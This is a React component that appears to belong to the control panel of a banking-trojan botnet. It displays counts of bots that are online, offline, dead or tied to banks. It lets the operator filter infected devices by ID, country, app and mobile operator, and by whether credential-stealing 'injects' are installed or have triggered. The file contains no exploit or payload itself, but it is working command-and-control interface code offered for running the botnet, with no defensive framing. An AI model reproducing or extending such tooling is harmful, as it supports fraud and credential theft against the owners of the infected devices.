import { useContext, useEffect, useRef } from 'react';
import { Input, Checkbox, Tag } from 'antd';
import { BotContext } from './providers';
import { BotStateType } from '../../common/DataType';
import { getMainStats } from './services';

export default () => {
  const { state, setState } = useContext(BotContext)

  useEffect(() => {
    getMainStats().then((res) => {
      setState((state: BotStateType) => {
        return {
          ...state,
          stats: res
        }
      })
    })
  }, [state.table.rows])

  return (
    <div className='mb-4 mt-4 text-center w-[600px] m-auto'>
      <div className='mb-2 m-auto'>
        <Tag color='cyan'>Bots {state.stats.bots}</Tag>
        <Tag color='success'>Online {state.stats.online}</Tag>
        <Tag color='volcano'>Offline {state.stats.offline}</Tag>
        <Tag color='warning'>Dead {state.stats.dead}</Tag>
        <Tag color='lime'>Bank {state.stats.banks}</Tag>
      </div>
      <div className='flex'>
        <Input placeholder='ID' className='!mb-2 !mr-1' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, botId: e.target.value } }))} />
        <Input placeholder='Country Code' className='!mb-2 !mr-1' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, country: e.target.value } }))} />
        <Input placeholder='App' className='!mb-2 !mr-1' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, app: e.target.value } }))} />
        <Input placeholder='Operator' className='!mb-2 !mr-2' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, operator: e.target.value } }))} />
      </div>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, online: e.target.checked } }))}>Online</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, offline: e.target.checked } }))}>Offline</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, dead: e.target.checked } }))}>Dead</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, hasInjects: e.target.checked } }))}>Has Injects</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, hasNotInjects: e.target.checked } }))}>Has not injects</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, search: { ...state.search, triggeredInject: e.target.checked } }))}>Triggered inject</Checkbox>
    </div>
  )
}